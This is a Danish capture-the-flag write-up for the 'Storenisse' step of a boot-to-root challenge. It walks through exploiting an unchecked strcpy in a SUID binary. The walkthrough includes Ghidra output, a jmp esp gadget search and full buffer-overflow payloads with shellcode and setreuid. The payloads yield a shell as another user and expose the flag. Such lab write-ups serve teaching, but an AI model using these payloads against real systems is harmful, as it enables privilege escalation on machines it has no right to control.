## B2R - Storenisse
<hr>

Vi er på maskinen som "mellemnisse", og vil gerne blive brugeren "storenisse".

Spoiler: Både storenisse og root opgaverne kan bypasses. Se hvordan [her](B2R%20-%20Root.md) eller følg med her og lær om PWN:


Vi begynder med at kigge os lidt omkring på maskinen:

```shell
cd /
ls -la                                                                                                                                                           
total 104                                                                                                                                                        
drwxr-xr-x  25 root        root         4096 Nov 18 21:09 .                                                                                                      
drwxr-xr-x  25 root        root         4096 Nov 18 21:09 ..                                                                                                     
dr-xr-xr-x   2 mellemnisse mellemnisse  4096 Nov 11 13:20 adgang                                                                                                 
drwxr-xr-x   2 root        root         4096 Nov 11 12:05 bin                                                                                                    
drwxr-xr-x   4 root        root         4096 Nov 11 12:05 boot                                                                                                   
d---------   2 storenisse  storenisse   4096 Nov 19 22:02 bulkimport_ønsker                                                                                      
drwxr-xr-x  18 root        root         3760 Nov 20 13:19 dev                                                                                                    
drwxr-xr-x  94 root        root         4096 Nov 20 11:15 etc                                                                                                    
drwxr-xr-x   5 root        root         4096 Nov 11 13:23 home                                                                                                   
lrwxrwxrwx   1 root        root           33 Nov 11 12:03 initrd.img -> boot/initrd.img-4.4.0-186-generic                                                        
lrwxrwxrwx   1 root        root           33 Nov 11 12:03 initrd.img.old -> boot/initrd.img-4.4.0-186-generic                                                    
drwxr-xr-x  22 root        root         4096 Nov 11 12:05 lib                                                                                                    
drwxr-xr-x   2 root        root         4096 Nov 11 12:03 lib64                                                                                                  
drwx------   2 root        root        16384 Nov 11 12:03 lost+found                                                                                             
drwxr-xr-x   3 root        root         4096 Nov 11 12:03 media                                                                                                  
drwxr-xr-x   2 root        root         4096 Aug 10 20:14 mnt                                                                                                    
drwxr-xr-x   2 root        root         4096 Aug 10 20:14 opt                                                                                                    
dr-xr-xr-x 122 root        root            0 Nov 20 13:19 proc                                                                                                   
drwx------   2 root        root         4096 Nov 19 23:08 root                                                                                                   
drwxr-xr-x  23 root        root          860 Nov 20 13:36 run                                                                                                    
drwxr-xr-x   2 root        root        12288 Nov 11 12:06 sbin                                                                                                   
drwxr-xr-x   2 root        root         4096 Nov 11 12:06 snap
drwxr-xr-x   2 root        root         4096 Aug 10 20:14 srv
dr-xr-xr-x  13 root        root            0 Nov 20 13:19 sys
drwxrwxrwt   8 root        root         4096 Nov 20 13:39 tmp
drwxr-xr-x  10 root        root         4096 Nov 11 12:03 usr
drwxr-xr-x  14 root        root         4096 Nov 11 12:05 var
lrwxrwxrwx   1 root        root           30 Nov 11 12:03 vmlinuz -> boot/vmlinuz-4.4.0-186-generic
lrwxrwxrwx   1 root        root           30 Nov 11 12:03 vmlinuz.old -> boot/vmlinuz-4.4.0-186-generic
cd bulkimport_ønsker
sh: 11: cd: can't cd to bulkimport_ønsker
ls -la bulkimport_ønsker
ls: cannot open directory 'bulkimport_'$'\303\270''nsker': Permission denied
cd home
ls
lillenisse
mellemnisse
storenisse
cd storenisse
ls
import_ønsker.elf
storenisse.txt
ls -al
total 708
drwxr-xr-x 2 storenisse storenisse   4096 Nov 19 23:06 .
drwxr-xr-x 5 root       root         4096 Nov 11 13:23 ..
-rw-r--r-- 1 storenisse storenisse    220 Nov 11 12:05 .bash_logout
-rw-r--r-- 1 storenisse storenisse   3771 Nov 11 12:05 .bashrc
-rw-r--r-- 1 storenisse storenisse    655 Nov 11 12:05 .profile
-r-sr-xr-x 1 storenisse storenisse 697028 Nov 18 21:01 import_ønsker.elf
---------- 1 storenisse storenisse     24 Nov 18 20:58 storenisse.txt
cat storenisse.txt
cat: storenisse.txt: Permission denied
cp import_ønsker.elf /home/mellemnisse
ls -la /home/mellemnisse
total 704
drwxr-xr-x 2 mellemnisse mellemnisse   4096 Nov 20 13:47 .
drwxr-xr-x 5 root        root          4096 Nov 11 13:23 ..
-rw-r--r-- 1 mellemnisse mellemnisse    220 Nov 11 13:23 .bash_logout
-rw-r--r-- 1 mellemnisse mellemnisse   3771 Nov 11 13:23 .bashrc
-rw-r--r-- 1 mellemnisse mellemnisse    655 Nov 11 13:23 .profile
-r-xr-xr-x 1 mellemnisse mellemnisse 697028 Nov 20 13:47 import_ønsker.elf
./import_ønsker.elf
:: Import af ønsker - Copyright (c) 2020 Nisseværkstedet
.................................................................>
- Mangler et ønske som parameter!
./import_ønsker.elf AAAA
:: Import af ønsker - Copyright (c) 2020 Nisseværkstedet
.................................................................>
./import_ønsker.elf AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
ls -al
total 712
drwxr-xr-x 2 storenisse storenisse    4096 Nov 20 13:47 .
drwxr-xr-x 5 root       root          4096 Nov 11 13:23 ..
-rw-r--r-- 1 storenisse storenisse     220 Nov 11 12:05 .bash_logout
-rw-r--r-- 1 storenisse storenisse    3771 Nov 11 12:05 .bashrc
-rw-r--r-- 1 storenisse storenisse     655 Nov 11 12:05 .profile
-r-sr-xr-x 1 storenisse storenisse  697028 Nov 18 21:01 import_ønsker.elf
-rw-r--r-- 1 storenisse mellemnisse    117 Nov 20 13:47 nye_ønsker.wishes.encrypted
---------- 1 storenisse storenisse      24 Nov 18 20:58 storenisse.txt
```

Vi har fundet et program i storenisses home-mappe:

```shell
-r-sr-xr-x 1 storenisse storenisse 697028 Nov 18 21:01 import_ønsker.elf
```

Vi ser at programmet har SUID, og at alle kan køre det. Dvs. at hvis vi kører programmet, så kører det ikke som mellemnisse, men som storenisse. Dette er ret standard for en PWN opgave, og det er derfor ret klart at vi skal finde en sårbarhed i "import_ønsker.elf", så vi kan eskalere vores rettigheder på maskinen til at køre som storenisse.

<br>

## Download af import_ønsker.elf

Vi downloader nu filen. Dette kan f.eks. gøres ved at base64 den, og copy/paste til vores egen maskine, for derefter at "base64 -d" for at få filen igen:

Et andet alternativ er at opsætte en hurtig Python webserver, hvilket vi kan nu da firewallen er åben:

```text
python3 -m http.server 12345
```

Og downloade via Kali:

```text
wget 10.10.158.251:12345/import_ønsker.elf
```

<br>

## Analyse af import_ønsker.elf

Man kan her skippe en egentlig analyse af koden, og bare prøve at give meget lange input til filen. Men lad os lige åbne filen i f.eks. Ghidra:

```C
  uint local_38 [4];
  undefined4 local_28;
  undefined4 uStack36;
  undefined4 uStack32;
  undefined4 uStack28;
  
  local_38[0] = 0;
  local_38[1] = 0;
  local_38[2] = 0;
  local_38[3] = 0;
  local_28 = 0;
  uStack36 = 0;
  uStack32 = 0;
  uStack28 = 0;
  puts(":: Import af ønsker - Copyright (c) 2020 Nisseværkstedet");
  puts(".................................................................>");
  if (param_1 < 2) {
    puts("- Mangler et ønske som parameter!");
    uVar4 = 1;
  }
  else {
    pbVar3 = (byte *)strcpy((char *)local_38,*(char **)(param_2 + 8));
```

Der bruges "stcpy" uden et bounds-check, dvs. at der skrives ind i en buffer uden at der er tjekket om bufferen er stor nok. Det må give et buffer overflow. Vi prøver at give en meget lang streng:

```shell
./import_ønsker.elf $(python -c 'print "A"*401')
```

Dvs. vi sender en tekst streng med 401 A'er, og får:

```text
Program received signal SIGSEGV, Segmentation fault.
```

For at lokalisere hvor der crashes, kan man bruge f.eks. GDB (med PEDA udviddelsen) eller IDA Pro Freeware, der begge har en debugger.

Når vi har lokaliseret hvilke bytes i vores input text, der overskriver RIP (Instruktions Pointeren), så skal vi finde noget kode at hoppe til. Typisk vil dette være et hop til stakken, hvor vores kode ligger. Dette findes f.eks. i GDB/PEDA:

```text
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x43434343 in ?? ()
gdb-peda$ jmpcall esp
0x8049ddc : jmp esp
0x80b21a3 : jmp esp
0x80b21cb : jmp esp
0x80b3b0f : call esp
0x80b3d93 : jmp esp
0x80b4033 : call esp
0x80b4047 : call esp
0x80b59ef : call esp
0x80c2570 : call esp
0x80c568b : call esp
0x80ceff3 : jmp esp
0x80d3317 : call esp
0x80d4c7f : call esp
gdb-peda$ 
```

Vi tager den første, og verificerer i vores debugger at instruktionen bliver eksekveret:

```shell
./import_ønsker.elf $(python -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xdc\x9d\x04\x08BBBBBBBB"')
```

Nu skal vi have noget assembler kode, som kan give os en shell - dvs. "shell-kode". Denne kode skal så bare ligge i forlængelse af den første instruktion. Vi kan f.eks. bruge koden fra:

http://shell-storm.org/shellcode/files/shellcode-358.php

Dvs.:

```text
\x1b\x5f\x31\xc0\x6a\x53\x6a\x18\x59\x49\x5b\x8a\x04\x0f\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8\xe0\xff\xff\xff\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2c
```

Vi prøver:

```text
./import_ønsker.elf $(python -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x18\x59\x49\x5b\x8a\x04\x0f\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8\xe0\xff\xff\xff\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2cBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"')
```

Og vi får en shell!

Men begejstringen varer kort, da vi ser at vi stadig bare er brugeren mellemnisse! Det er fordi Linux godt nok har startet programmet som storenisse, men så snart vi spawnede et nyt program "/bin/sh", så blev disse rettigheder glemt igen.

Løsningen er at programmet skal kalde:

```text
setreuid(geteuid(),geteuid())
```

Dette kan gøres med noget ekstra shell-kode:

http://shell-storm.org/shellcode/files/shellcode-399.php

```text
\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\
```

Så prøver vi igen, og det virker!:

```shell
./import_ønsker.elf $(python3 -c 'import sys; sys.stdout.buffer.write(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xdc\x9d\x04\x08\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x18\x59\x49\x5b\x8a\x04\x0f\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8\xe0\xff\xff\xff\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2cBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB")')
id
uid=1000(storenisse) gid=1002(mellemnisse) groups=1002(mellemnisse)

cat storenisse.txt
cat: storenisse.txt: Permission denied
```

Vi ser at vi stadig ikke kan læse flaget, men at det bare er fordi vi ikke har sat denne rettighed:

```shell
chmod +r storenisse.txt
cat storenisse.txt
```

<details>
<summary>Spoiler alert - Flaget til storenisse:</summary>

nc3{jul_th3_w0r1d_2o20}

En reference til filmen [Hackers](https://en.wikipedia.org/wiki/Hackers_(film)).

</details>
